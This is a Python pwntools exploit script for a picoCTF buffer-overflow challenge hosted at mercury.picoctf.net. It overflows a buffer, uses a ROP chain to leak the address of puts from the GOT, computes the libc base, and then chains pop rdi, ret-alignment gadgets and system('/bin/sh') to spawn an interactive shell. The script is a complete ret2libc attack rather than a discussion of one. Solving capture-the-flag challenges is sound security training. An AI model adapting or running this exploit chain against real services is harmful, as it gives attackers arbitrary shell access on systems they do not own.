#!/usr/bin/python3

from pwn import *
import struct

#init
elf = ELF("./vuln")

'''
$ ldd vuln
        linux-vdso.so.1 (0x00007ffcd37f7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f76e16e7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f76e18c5000)
'''

#selection on local or remote
LOCAL = False

if(LOCAL):
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	p = elf.process()
else:
	host = 'mercury.picoctf.net'
	port = 23584
	libc = ELF("./libc/libc.so.6")
	p = remote(host, port)


#find RIP offset with gdb-peda & python printing patterns
#found 136 padding
padding = b"A"*136

#find 'pop rdi; ret' with ROPgadget to make sure puts() get the puts GOT param 
#puts will print out the puts GOT from the rdi
'''
─$ ROPgadget --binary ./vuln | grep "pop rdi"                                                 2 ⨯
0x0000000000400913 : pop rdi ; ret
'''
ropGadget = struct.pack("<Q", 0x0000000000400913)

#find puts offset in vuln binary
putsGOT = elf.got['puts']	#puts in GOT (pass func name => 'puts' into puts to print puts GOT)
putsPLT = elf.plt['puts'] #puts in plt (call puts())
do_stuffFunc = struct.pack("<Q", 0x00000000004006d8)	#call do_stuff() to continue again

#crafting payload to start puts GOT leaking
payload = b''.join([
	padding,
	ropGadget,
	p64(putsGOT),
	p64(putsPLT),
	do_stuffFunc
	])

#start leaking the puts GOT
print(p.recvuntil("\n").rstrip())
p.sendline(payload)
print(p.recvuntil('\n').strip())
leakrecv = p.recv().strip()
print(leakrecv)
leak = u64(leakrecv+(8-len(leakrecv))*b"\x00")	#little endian back the leak address

print("leaked puts() memory address: " + str(hex(leak)))

#calculate libc based address
puts_offset = libc.symbols['puts']
libc_based = leak - puts_offset

print("LIBC based memory address: " + str(hex(libc_based)))

# calculate system & exit memory address with leaked libc based address
# eg: (beginning of memory address of libc) + (position of system function in libc.so)
'''
another technique in finding the offsets & strings:
└─$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system                                   1 ⨯
  1430: 0000000000048db0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
└─$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'                           1 ⨯
 18a156 /bin/sh
'''
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search(b'/bin/sh'))	#getting 1st result from generator

system_address = libc_based + system_offset
exit_address = libc_based + exit_offset
binsh_address = libc_based + binsh_offset

print()
print("system address: " + str(hex(system_address)))
print("exit address: " + str(hex(exit_address)))
print("/bin/sh address: " + str(hex(binsh_address)))

'''
Exploit works on Local but not in Remote Explanation: 
-in the x64 arch, there's some different between ubuntu 16 & 18
-the memory realm runs in 16 bytes boundary
-our payload need to be align in 16 bytes
'''

#ret; address found in vuln binary with ROPgadget (used to fillup the 8 bytes payload to 16bytes)
ret = 0x000000000040052e

#crafting payload
payload = b"".join([
	padding,
	ropGadget,	
	p64(binsh_address),	#16 bytes => pop rdi; ret; + binsh_address
	p64(ret),
	p64(system_address),	#16 bytes => ret; + system_address
	p64(ret),
	p64(exit_address)	#16 bytes => ret; exit_address
	])

#sending payload spawning shell
p.sendline(payload)
p.interactive()



